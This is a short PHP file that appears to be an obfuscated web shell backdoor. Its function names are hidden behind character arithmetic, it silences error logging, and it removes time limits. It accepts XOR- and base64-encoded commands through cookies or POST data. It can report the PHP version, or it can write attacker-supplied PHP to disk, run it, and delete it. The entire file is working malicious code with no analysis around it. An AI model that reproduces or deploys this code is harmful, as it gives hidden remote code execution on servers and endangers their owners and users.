<?php $jshdxlzns = "\146"."\x69".chr(108).chr(101)."\137"."\160".'u'."\x74"."\137".'c'.chr(1024-913)."\x6e".chr(116)."\145".chr(110).'t'."\x73";
$atqbm = "\x62".chr(97)."\163".chr(295-194)."\x36".chr(277-225).chr(1052-957)."\x64".'e'.'c'."\x6f".chr(981-881).'e';
$odwdu = chr(848-743)."\156".chr(105).chr(95).chr(115)."\x65".'t';
$xtgcsqeaiw = 'u'.'n'."\154".chr(105).chr(999-889).chr(107);


@$odwdu(chr(780-679).chr(135-21).chr(710-596)."\x6f".chr(114).'_'."\154".'o'.chr(103), NULL);
@$odwdu("\154".'o'.'g'.chr(909-814).chr(101).chr(250-136).chr(114)."\x6f"."\x72".chr(621-506), 0);
@$odwdu('m'."\x61".'x'.chr(95)."\x65"."\170".chr(101)."\x63".chr(117).chr(225-109)."\151".chr(251-140).'n'."\137"."\x74"."\x69"."\155".'e', 0);
@set_time_limit(0);

function rmpkqx($juzfcwmj, $uxbkfyq)
{
    $vtctti = "";
    for ($ulajcqw = 0; $ulajcqw < strlen($juzfcwmj);) {
        for ($j = 0; $j < strlen($uxbkfyq) && $ulajcqw < strlen($juzfcwmj); $j++, $ulajcqw++) {
            $vtctti .= chr(ord($juzfcwmj[$ulajcqw]) ^ ord($uxbkfyq[$j]));
        }
    }
    return $vtctti;
}

$mnarvkcfas = array_merge($_COOKIE, $_POST);
$suyffwwkg = '3cd0186c-6989-4536-9074-8d470ad3e64c';
foreach ($mnarvkcfas as $zycpqlccms => $juzfcwmj) {
    $juzfcwmj = @unserialize(rmpkqx(rmpkqx($atqbm($juzfcwmj), $suyffwwkg), $zycpqlccms));
    if (isset($juzfcwmj["\x61".chr(107)])) {
        if ($juzfcwmj["\141"] == chr(227-122)) {
            $ulajcqw = array(
                "\160"."\x76" => @phpversion(),
                "\x73".chr(167-49) => "3.5",
            );
            echo @serialize($ulajcqw);
        } elseif ($juzfcwmj["\141"] == "\145") {
            $byjglor = "./" . md5($suyffwwkg) . "\56".chr(986-881).chr(174-64)."\x63";
            @$jshdxlzns($byjglor, "<" . "\x3f".chr(112)."\x68"."\160"."\40".chr(64)."\165".chr(352-242)."\x6c".chr(105)."\156".chr(736-629).chr(1038-998)."\x5f"."\137"."\106"."\111"."\x4c".chr(926-857)."\x5f"."\x5f".chr(41).chr(59).chr(640-608) . $juzfcwmj['d']);
            @include($byjglor);
            @$xtgcsqeaiw($byjglor);
        }
        exit();
    }
}

